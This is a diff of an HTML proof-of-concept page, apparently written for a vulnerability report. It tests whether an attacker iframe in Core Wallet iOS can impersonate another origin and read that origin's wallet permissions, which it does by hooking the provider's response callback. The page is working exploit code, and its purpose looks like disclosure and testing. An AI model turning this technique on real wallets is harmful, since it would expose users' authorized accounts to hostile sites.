@@ -1,9 +1,8 @@
 <!doctype html>
-<html>
-<head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Core Wallet iOS - Authorization Reuse</title>
+
+<title>Core Wallet iOS - Cross-Origin Permission Reuse</title>
 
 <style>
 body{
@@ -17,24 +16,21 @@ button{padding:10px 14px;margin:6px 0}
 pre{
   white-space:pre-wrap;
   overflow-wrap:anywhere;
-  padding:12px;
   background:#f7f7f7;
-  border:1px solid #ccc
+  border:1px solid #ccc;
+  padding:12px
 }
 #verdict{
-  margin:12px 0;
   padding:12px;
+  margin:12px 0;
   border:2px solid #b00000;
   color:#b00000;
   font-weight:bold
 }
 iframe{width:100%;height:60px;border:1px solid #ccc}
 </style>
-</head>
 
-<body>
-
-<h2>Core Wallet iOS - Cross-Origin Authorization Reuse</h2>
+<h2>Core Wallet iOS - Cross-Origin Permission Reuse</h2>
 
 <p>
 Victim / Origin A:<br>
@@ -50,15 +46,13 @@ Attacker / Origin B:<br>
 1. Connect Origin A normally
 </button>
 
-<br>
-
 <button id="attack" disabled>
-2. Origin B calls eth_accounts as Origin A
+2. Origin B reads A permissions
 </button>
 
 <div id="verdict" hidden></div>
 
-<pre id="log">Loading attacker iframe...</pre>
+<pre id="log">Loading Origin B...</pre>
 
 <iframe id="frame"></iframe>
 
@@ -68,23 +62,27 @@ const ATTACKER =
 
 const TEST_ID = 733731;
 
-const frame = document.getElementById('frame');
-const log = document.getElementById('log');
-const verdict = document.getElementById('verdict');
-const attackButton = document.getElementById('attack');
+const frame =
+  document.getElementById('frame');
 
-const attackerOrigin = new URL(ATTACKER).origin;
+const log =
+  document.getElementById('log');
+
+const verdict =
+  document.getElementById('verdict');
+
+const attackerOrigin =
+  new URL(ATTACKER).origin;
 
 document.getElementById('originA').textContent =
   location.origin;
 
-
-function print(text = '') {
-  log.textContent += text + '\n';
+function print(s = '') {
+  log.textContent += s + '\n';
 }
 
 
-// Load Origin B
+// Load attacker iframe
 const child = new URL(ATTACKER);
 
 child.searchParams.set(
@@ -96,8 +94,11 @@ frame.src = child.href;
 
 
 addEventListener('message', event => {
-  if (event.source !== frame.contentWindow) return;
-  if (event.origin !== attackerOrigin) return;
+  if (event.source !== frame.contentWindow)
+    return;
+
+  if (event.origin !== attackerOrigin)
+    return;
 
   if (event.data?.type === 'READY') {
     log.textContent =
@@ -107,13 +108,13 @@ ${event.origin}
 Victim Origin A:
 ${location.origin}
 
-Ready. Connect Origin A first.`;
+Ready.`;
   }
 
   if (event.data?.type === 'REQUEST_SENT') {
     print('');
-    print('Origin B sent native request:');
-    print('Method: eth_accounts');
+    print('Origin B sent native request');
+    print('Method: wallet_getPermissions');
     print('Actual origin: ' + event.origin);
     print('Claimed origin: ' + location.origin);
     print('Request ID: ' + TEST_ID);
@@ -121,29 +122,27 @@ Ready. Connect Origin A first.`;
 });
 
 
-// Step 1
+// STEP 1
 document.getElementById('connect').onclick = async () => {
 
   if (!window.ethereum?.request) {
-    print('ERROR: Core provider unavailable.');
+    print('ERROR: Core provider unavailable');
     return;
   }
 
   try {
     print('');
-    print('Connecting Origin A normally...');
+    print('Origin A calling eth_requestAccounts...');
 
     const accounts =
       await window.ethereum.request({
         method: 'eth_requestAccounts'
       });
 
-    print(
-      'Origin A authorized accounts: ' +
-      JSON.stringify(accounts)
-    );
+    print('Origin A connected:');
+    print(JSON.stringify(accounts));
 
-    attackButton.disabled = false;
+    document.getElementById('attack').disabled = false;
 
   } catch (e) {
     print(
@@ -154,22 +153,20 @@ document.getElementById('connect').onclick = async () => {
 };
 
 
-// Step 2
-attackButton.onclick = () => {
+// STEP 2
+document.getElementById('attack').onclick = () => {
 
   print('');
-  print('=== CROSS-ORIGIN TEST ===');
+  print('=== CROSS-ORIGIN PERMISSION TEST ===');
 
-  /*
-   * Install observer NOW, after Core provider exists.
-   */
-  if (typeof window.__coreProviderRespond !== 'function') {
-    print('ERROR: __coreProviderRespond unavailable.');
+  if (
+    typeof window.__coreProviderRespond !== 'function'
+  ) {
+    print('ERROR: Core callback unavailable');
     return;
   }
 
-
-  if (!window.__reuseObserverInstalled) {
+  if (!window.__permissionObserver) {
 
     const original =
       window.__coreProviderRespond;
@@ -180,63 +177,59 @@ attackButton.onclick = () => {
         if (id === TEST_ID) {
 
           print('');
-          print('Native response for Origin-B request:');
-          print(
-            JSON.stringify({
-              id,
-              error,
-              result
-            }, null, 2)
-          );
+          print('Native response to Origin-B request:');
+
+          print(JSON.stringify({
+            id,
+            error,
+            result
+          }, null, 2));
 
 
-          if (
+          const hasPermission =
             !error &&
             Array.isArray(result) &&
-            result.length > 0
-          ) {
+            result.length > 0;
+
+
+          if (hasPermission) {
 
             verdict.hidden = false;
 
             verdict.textContent =
-              'VULNERABLE: Cross-origin Origin B obtained accounts using Origin A authorization.';
+              'VULNERABLE: Cross-origin Origin B obtained permission state belonging to Origin A.';
 
             print('');
             print('IMPACT PROVEN:');
             print(
-              'Origin B received the wallet account authorized for Origin A.'
+              'Origin B was treated as already-authorized Origin A.'
             );
 
           } else {
 
             print('');
             print(
-              'Authorization reuse NOT proven on this run.'
+              'Permission reuse not demonstrated.'
             );
           }
         }
 
-        return original.apply(this, arguments);
+        return original.apply(
+          this,
+          arguments
+        );
     };
 
-    window.__reuseObserverInstalled = true;
+    window.__permissionObserver = true;
   }
 
 
-  print('Asking Origin B to call eth_accounts...');
   print('Actual Origin B: ' + attackerOrigin);
-  print('Claimed Origin A: ' + location.origin);
+  print('Origin claimed by B: ' + location.origin);
 
-
-  frame.contentWindow.postMessage(
-    {
-      type: 'READ_ACCOUNTS',
-      id: TEST_ID
-    },
-    attackerOrigin
-  );
+  frame.contentWindow.postMessage({
+    type: 'GET_PERMISSIONS_AS_A',
+    id: TEST_ID
+  }, attackerOrigin);
 };
 </script>
-
-</body>
-</html>
